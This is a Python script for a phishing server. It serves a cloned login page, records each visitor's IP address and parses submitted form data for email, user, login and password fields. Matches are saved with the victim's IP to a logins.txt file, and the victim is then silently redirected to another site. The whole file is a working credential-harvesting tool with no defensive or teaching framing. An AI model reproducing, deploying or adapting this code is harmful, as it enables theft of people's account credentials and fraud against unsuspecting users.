from http.server import HTTPServer, BaseHTTPRequestHandler
from colorama import Fore, Style
from io import BytesIO
import urllib.request
import logging
import time
import re

class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
    
    ips = []

    def run():
        #Here is where the server runs
        running = False
        httpd = HTTPServer(('0.0.0.0', 8000), SimpleHTTPRequestHandler)
        while not running:
            print('.::Listening on port 8000...\n')
            httpd.serve_forever()

    def do_GET(self):   #Request via GET
        self.send_response(200)
        self.end_headers()
        file = open('site/index.html','r')
        readfile = file.readlines()
        for lines in readfile:
            self.wfile.write(lines.encode())
        self.get_ip()
        print(Fore.RED+'[+]IP Found:',self.ips[-1])
        print(Style.RESET_ALL)

    def do_POST(self):  #Request via POST
        content_length = int(self.headers['Content-Length'])
        body = self.rfile.read(content_length)
        self.send_response(200)
        self.end_headers()
        response = BytesIO()
        response.write(body)
        values = response.getvalue()
        self.getCredentials(values)

    def get_ip(self):
        log = str(self.headers).split('\n')
        for lines in log:
            if re.search('^'+'X-Forwarded-For',lines):
                address = lines.split('X-Forwarded-For: ')
                self.ips.append(address[1])
        

    def log_message(self, format, *args):
        logging.error(self.headers)


    def getCredentials(self, values):
        post = values.decode('UTF-8')
        readpost = post.strip('&')
        forms = ['email','user','login','pass'] #Possibles forms to get the credentials
        
        readpost = readpost.split('&')
        count = 0
        possibles = []
        file = open('logins.txt','a+')
        for line in readpost:
            for c in forms:
                if c in line and re.search("^"+str(c),line) and len(line) > 0:
                    possibles.append(line)
                    count +=1
                    if count >= 2:
                        print('\n' + Fore.RED + "=" * 15 + " Possible Credentials " + "=" * 15)
                        print('[+].::',possibles)
                        print("=" * 52 + "\n")
                        print(Style.RESET_ALL)
                        file.write('IP: '+self.ips[-1]+'\n'+'    '.join(possibles)+'\n')
                        count = 0
                        possibles = []
        file.close()
        print("[!] Redirecting...")
        self.redirect()

    def redirect(self):
        urlf = open('site/redirect.txt','r')
        url = urlf.readlines()
       
        response = BytesIO()
        redir = "<script>window.location.href=\"%s\"</script>" % (url[0])
        self.wfile.write(redir.encode())
        print('[+] Done!')

if not __name__ == '__main__':
    SimpleHTTPRequestHandler.run()
